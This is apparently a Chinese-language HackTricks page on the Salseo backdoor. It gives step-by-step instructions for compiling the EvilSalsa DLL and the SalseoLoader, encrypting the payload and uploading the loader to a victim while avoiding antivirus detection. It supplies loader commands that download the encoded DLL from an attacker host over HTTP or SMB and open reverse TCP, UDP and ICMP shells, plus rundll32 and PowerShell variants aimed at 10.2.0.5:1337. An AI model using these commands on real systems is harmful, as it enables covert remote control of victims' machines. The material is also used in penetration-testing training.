# Salseo

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

## 编译二进制文件

从 github 下载源代码并编译 **EvilSalsa** 和 **SalseoLoader**。您需要安装 **Visual Studio** 来编译代码。

为您将要使用的 Windows 机器的架构编译这些项目（如果 Windows 支持 x64，则为该架构编译）。

您可以在 Visual Studio 的 **左侧“生成”选项卡**中的 **“平台目标”** 选择架构。

(\*\*如果找不到此选项，请按 **“项目选项卡”** 然后在 **“\<项目名称> 属性”** 中)

![](<../.gitbook/assets/image (839).png>)

然后，构建这两个项目（生成 -> 生成解决方案）（在日志中将出现可执行文件的路径）：

![](<../.gitbook/assets/image (381).png>)

## 准备后门

首先，您需要对 **EvilSalsa.dll** 进行编码。为此，您可以使用 python 脚本 **encrypterassembly.py** 或编译项目 **EncrypterAssembly**：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
好的，现在你拥有执行所有 Salseo 操作所需的一切：**编码的 EvilDalsa.dll** 和 **SalseoLoader 的二进制文件**。

**将 SalseoLoader.exe 二进制文件上传到机器上。它们不应该被任何 AV 检测到...**

## **执行后门**

### **获取 TCP 反向 shell（通过 HTTP 下载编码的 dll）**

记得启动 nc 作为反向 shell 监听器，并启动一个 HTTP 服务器来提供编码的 evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向Shell（通过SMB下载编码的dll）**

记得启动nc作为反向Shell监听器，并启动SMB服务器以提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取 ICMP 反向 shell（受害者内部已编码的 dll）**

**这次你需要一个特殊的工具在客户端接收反向 shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用 ICMP 回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，让我们执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 编译 SalseoLoader 为 DLL 导出主函数

使用 Visual Studio 打开 SalseoLoader 项目。

### 在主函数之前添加: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### 为此项目安装 DllExport

#### **工具** --> **NuGet 包管理器** --> **管理解决方案的 NuGet 包...**

![](<../.gitbook/assets/image (881).png>)

#### **搜索 DllExport 包（使用浏览选项卡），并按安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (100).png>)

在你的项目文件夹中出现了文件: **DllExport.bat** 和 **DllExport\_Configure.bat**

### **卸载 DllExport**

按 **卸载**（是的，这很奇怪，但相信我，这是必要的）

![](<../.gitbook/assets/image (97).png>)

### **退出 Visual Studio 并执行 DllExport\_configure**

只需 **退出** Visual Studio

然后，转到你的 **SalseoLoader 文件夹** 并 **执行 DllExport\_Configure.bat**

选择 **x64**（如果你打算在 x64 环境中使用，这是我的情况），选择 **System.Runtime.InteropServices**（在 **DllExport 的命名空间中**）并按 **应用**

![](<../.gitbook/assets/image (882).png>)

### **再次使用 Visual Studio 打开项目**

**\[DllExport]** 不应再标记为错误

![](<../.gitbook/assets/image (670).png>)

### 构建解决方案

选择 **输出类型 = 类库**（项目 --> SalseoLoader 属性 --> 应用程序 --> 输出类型 = 类库）

![](<../.gitbook/assets/image (847).png>)

选择 **x64** **平台**（项目 --> SalseoLoader 属性 --> 构建 --> 平台目标 = x64）

![](<../.gitbook/assets/image (285).png>)

要 **构建** 解决方案: 构建 --> 构建解决方案（在输出控制台中将出现新 DLL 的路径）

### 测试生成的 Dll

将 Dll 复制并粘贴到你想测试的位置。

执行:
```
rundll32.exe SalseoLoader.dll,main
```
如果没有错误出现，您可能有一个功能正常的 DLL！！

## 使用 DLL 获取 shell

不要忘记使用 **HTTP** **服务器** 并设置 **nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
